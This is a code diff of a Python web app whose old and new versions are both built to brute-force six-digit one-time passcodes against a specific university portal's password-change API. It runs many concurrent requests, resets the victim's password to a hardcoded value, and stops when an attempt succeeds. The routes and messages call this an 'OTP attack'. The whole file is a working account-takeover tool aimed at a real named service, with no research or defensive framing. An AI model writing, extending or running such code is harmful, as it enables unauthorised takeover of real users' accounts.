@@ -1,266 +1,117 @@
-# import os
-# import eventlet
-# eventlet.monkey_patch()  # must be first
-
-# from flask import Flask, render_template, request, jsonify
-# from flask_socketio import SocketIO
-# import asyncio
-# import aiohttp
-
-# app = Flask(__name__)
-# app.config['SECRET_KEY'] = 'secret!'
-# socketio = SocketIO(app, async_mode='gevent', cors_allowed_origins="*")
-
-# # Default configuration
-# API_URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
-# DEFAULT_COOKIE = "amplitude_iddigiicampus.com=YOUR_COOKIE_HERE"
-# DEFAULT_START = 100000
-# DEFAULT_MAX = 999999
-# DEFAULT_CONCURRENT = 50
-# DEFAULT_PASSWORD = "Sitare@09099"
-
-# # Store stop flags per client
-# stop_flags = {}
-
-# # Async OTP function
-# async def try_otp(session, phone, otp, stop_flag, cookie, new_password):
-#     if stop_flag['stop']:
-#         return None
-
-#     payload = {"phone": phone, "otp": str(otp), "newPassword": new_password}
-#     headers = {"Content-Type": "application/json", "Cookie": cookie}
-
-#     try:
-#         async with session.put(API_URL, json=payload, headers=headers) as resp:
-#             text = await resp.text()
-
-#             # Success: Empty response body
-#             if not text.strip():
-#                 stop_flag['stop'] = True
-#                 socketio.emit('finished', {
-#                     'status': 'success',
-#                     'otp_used': otp,
-#                     'message': 'Password changed successfully!'
-#                 })
-#                 return {"status": "success", "otp_used": otp, "response": text}
-
-#             # Check for invalid OTP stop condition
-#             try:
-#                 data_resp = await resp.json()
-#                 if data_resp.get("message") == "Invalid request, Otp already used":
-#                     stop_flag['stop'] = True
-#                     socketio.emit('finished', {
-#                         'status': 'stopped',
-#                         'otp_used': otp,
-#                         'message': data_resp["message"]
-#                     })
-#                     return {"status": "stopped", "otp_used": otp, "response": data_resp}
-#             except:
-#                 pass
-
-#             socketio.emit('log', {'otp': otp, 'status': 'attempted', 'response': text})
-#     except Exception as e:
-#         socketio.emit('log', {'otp': otp, 'status': 'failed', 'response': str(e)})
-
-#     return None
-
-
-# # Background OTP runner
-# def start_otp_background(client_id, phone, start, max_otp, concurrent, cookie, new_password):
-#     async def runner():
-#         stop_flag = stop_flags[client_id]
-#         connector = aiohttp.TCPConnector(limit=concurrent)
-#         async with aiohttp.ClientSession(connector=connector) as session:
-#             for batch_start in range(start, max_otp + 1, concurrent):
-#                 if stop_flag['stop']:
-#                     break
-#                 tasks = []
-#                 for i in range(concurrent):
-#                     otp = batch_start + i
-#                     if otp > max_otp:
-#                         break
-#                     tasks.append(asyncio.create_task(
-#                         try_otp(session, phone, otp, stop_flag, cookie, new_password)
-#                     ))
-#                 await asyncio.gather(*tasks)
-#     eventlet.spawn(asyncio.run, runner())
-
-
-# # Routes
-# @app.route('/')
-# def index():
-#     return render_template('index.html')
-
-
-# @app.route('/start', methods=['POST'])
-# def start_attack():
-#     data = request.json
-#     phone = data.get('phone')
-#     client_id = data.get('client_id', 'default')
-
-#     if not phone:
-#         return jsonify({'status': 'error', 'message': 'Phone number required'}), 400
-
-#     start = int(data.get('start') or DEFAULT_START)
-#     max_otp = int(data.get('max') or DEFAULT_MAX)
-#     concurrent = int(data.get('concurrent') or DEFAULT_CONCURRENT)
-#     cookie = data.get('cookie') or DEFAULT_COOKIE
-#     new_password = data.get('new_password') or DEFAULT_PASSWORD
-
-#     stop_flags[client_id] = {'stop': False}
-
-#     start_otp_background(client_id, phone, start, max_otp, concurrent, cookie, new_password)
-#     return jsonify({'status': 'started', 'message': 'OTP attack started!'})
-
-
-# @app.route('/stop', methods=['POST'])
-# def stop_attack():
-#     data = request.json
-#     client_id = data.get('client_id', 'default')
-
-#     if client_id in stop_flags:
-#         stop_flags[client_id]['stop'] = True
-#         return jsonify({'status': 'stopped', 'message': 'Attack stopped!'})
-#     return jsonify({'status': 'error', 'message': 'No active attack found'}), 400
-
-
-# # Run server
-# if __name__ == "__main__":
-#     port = int(os.environ.get("PORT", 5000))
-#     socketio.run(app, host="0.0.0.0", port=port, debug=True)
-
-
-
-import os
-import eventlet
-eventlet.monkey_patch()  # must be first
-
-from flask import Flask, render_template, request, jsonify
-from flask_socketio import SocketIO
+import socketio
 import asyncio
 import aiohttp
+from aiohttp import web
+import os
 
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'secret!'
-socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")
+# ----- Socket.IO server -----
+sio = socketio.AsyncServer(async_mode='aiohttp', cors_allowed_origins='*')
+app = web.Application()
+sio.attach(app)
 
-# Default configuration
-API_URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
-DEFAULT_COOKIE = "amplitude_iddigiicampus.com=YOUR_COOKIE_HERE"
-DEFAULT_START = 100000
-DEFAULT_MAX = 999999
-DEFAULT_CONCURRENT = 50
-DEFAULT_PASSWORD = "Sitare@09099"  # Hardcoded
+# ----- OTP script config -----
+URL = "https://sitareuniv.digiicampus.com/api/userManagement/change/password"
+PHONE = "91-xxxxxxxxx"
+NEW_PASSWORD = "Sitare@09099"
+# List of server messages that should stop the workers
+STOP_MESSAGES = [
+    "Invalid request, Otp already used",
+    "This is already used password"  # <-- new message to stop
+]
 
-# Store stop flags per client
-stop_flags = {}
 
-# Async OTP function
-async def try_otp(session, phone, otp, stop_flag, cookie, new_password):
-    if stop_flag['stop']:
-        return None
+START = 10000
+END = 999999
+CONCURRENT = 15
+DELAY = 0.09
 
-    payload = {"phone": phone, "otp": str(otp), "newPassword": new_password}
-    headers = {"Content-Type": "application/json", "Cookie": cookie}
+stop_event = asyncio.Event()
+counter = START
 
+# ----- OTP brute-force -----
+async def otp_brute(session: aiohttp.ClientSession, otp_value: str):
+    payload = {"phone": PHONE, "otp": otp_value, "newPassword": NEW_PASSWORD}
     try:
-        async with session.put(API_URL, json=payload, headers=headers) as resp:
+        async with session.put(URL, json=payload, timeout=10) as resp:
             text = await resp.text()
-
-            # Success: Empty response body
-            if not text.strip():
-                stop_flag['stop'] = True
-                socketio.emit('finished', {
-                    'status': 'success',
-                    'otp_used': otp,
-                    'message': 'Password changed successfully!'
-                })
-                return {"status": "success", "otp_used": otp, "response": text}
-
-            # Check for invalid OTP stop condition
-            try:
-                data_resp = await resp.json()
-                if data_resp.get("message") == "Invalid request, Otp already used":
-                    stop_flag['stop'] = True
-                    socketio.emit('finished', {
-                        'status': 'stopped',
-                        'otp_used': otp,
-                        'message': data_resp["message"]
-                    })
-                    return {"status": "stopped", "otp_used": otp, "response": data_resp}
-            except:
-                pass
-
-            socketio.emit('log', {'otp': otp, 'status': 'attempted', 'response': text})
+            return resp.status, text
     except Exception as e:
-        socketio.emit('log', {'otp': otp, 'status': 'failed', 'response': str(e)})
+        print(f"[NETWORK ERROR] OTP={otp_value}: {e}")
+        return None, None
 
-    return None
+# ----- Worker -----
+async def worker(worker_id: int):
+    global counter
+    async with aiohttp.ClientSession() as session:
+        while not stop_event.is_set():
+            otp_value = None
+            if counter <= END:
+                otp_value = str(counter).zfill(6)
+                counter += 1
+            else:
+                break
 
-# Background OTP runner
-def start_otp_background(client_id, phone, start, max_otp, concurrent, cookie, new_password):
-    async def runner():
-        stop_flag = stop_flags[client_id]
-        connector = aiohttp.TCPConnector(limit=concurrent)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            for batch_start in range(start, max_otp + 1, concurrent):
-                if stop_flag['stop']:
+            status, text = await otp_brute(session, otp_value)
+            snippet = str(text)[82:125] if text else ''
+            print(f"[Worker-{worker_id}] OTP={otp_value} Status={status} Body snippet={snippet}")
+
+            await sio.emit('log', {'otp': otp_value, 'response': snippet})
+
+            if status is not None:
+                if status not in (200, 400):
+                    stop_event.set()
+                    await sio.emit('finished', {'otp_used': otp_value, 'status': 'Stopped', 'message': f"Unexpected HTTP status {status}"})
                     break
-                tasks = []
-                for i in range(concurrent):
-                    otp = batch_start + i
-                    if otp > max_otp:
-                        break
-                    tasks.append(asyncio.create_task(
-                        try_otp(session, phone, otp, stop_flag, cookie, new_password)
-                    ))
-                await asyncio.gather(*tasks)
 
-    # Run runner in a new event loop inside a green thread
-    def run_runner():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(runner())
-
-    eventlet.spawn(run_runner)
-
-# Routes
-@app.route('/')
-def index():
-    return render_template('index.html')
+            # Stop if server returns any STOP_MESSAGES
+            if text:
+                for msg in STOP_MESSAGES:
+                    if msg.lower() in text.lower():
+                        stop_event.set()
+                        await sio.emit('finished', {'otp_used': otp_value, 'status': 'Stopped', 'message': msg})
+                        return  # stop this worker immediately
 
 
-@app.route('/start', methods=['POST'])
-def start_attack():
-    data = request.json
-    phone = data.get('phone')
-    client_id = data.get('client_id', 'default')
+            if status and 200 <= status < 300:
+                stop_event.set()
+                await sio.emit('finished', {'otp_used': otp_value, 'status': 'Success', 'message': f"HTTP {status}"})
+                break
 
-    if not phone:
-        return jsonify({'status': 'error', 'message': 'Phone number required'}), 400
+            await asyncio.sleep(DELAY)
 
-    start = int(data.get('start') or DEFAULT_START)
-    max_otp = int(data.get('max') or DEFAULT_MAX)
-    concurrent = int(data.get('concurrent') or DEFAULT_CONCURRENT)
-    cookie = data.get('cookie') or DEFAULT_COOKIE
-    new_password = data.get('new_password') or DEFAULT_PASSWORD
+# ----- Start all workers -----
+async def start_workers():
+    tasks = [asyncio.create_task(worker(i+1)) for i in range(CONCURRENT)]
+    await asyncio.gather(*tasks)
 
-    stop_flags[client_id] = {'stop': False}
+# ----- Socket.IO events -----
+@sio.event
+async def connect(sid, environ):
+    print('Client connected:', sid)
 
-    start_otp_background(client_id, phone, start, max_otp, concurrent, cookie, new_password)
-    return jsonify({'status': 'started', 'message': 'OTP attack started!'})
+@sio.event
+async def start(sid, data):
+    global PHONE, NEW_PASSWORD, START, END, CONCURRENT, DELAY, counter, stop_event
+    PHONE = data.get('phone', PHONE)
+    NEW_PASSWORD = data.get('newPassword', NEW_PASSWORD)
+    START = data.get('start', START)
+    END = data.get('end', END)
+    CONCURRENT = data.get('concurrent', CONCURRENT)
+    DELAY = data.get('delay', DELAY)
+    counter = START
+    stop_event.clear()
+    asyncio.create_task(start_workers())
 
-@app.route('/stop', methods=['POST'])
-def stop_attack():
-    data = request.json
-    client_id = data.get('client_id', 'default')
+@sio.event
+async def stop(sid):
+    stop_event.set()
 
-    if client_id in stop_flags:
-        stop_flags[client_id]['stop'] = True
-        return jsonify({'status': 'stopped', 'message': 'Attack stopped!'})
-    return jsonify({'status': 'error', 'message': 'No active attack found'}), 400
+# ----- Serve index.html -----
+async def index(request):
+    return web.FileResponse(os.path.join('templates', 'index.html'))
 
-# Run server
+app.router.add_get('/', index)
+
+# ----- Run server -----
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    socketio.run(app, host="0.0.0.0", port=port, debug=True)
+    web.run_app(app, port=5000)
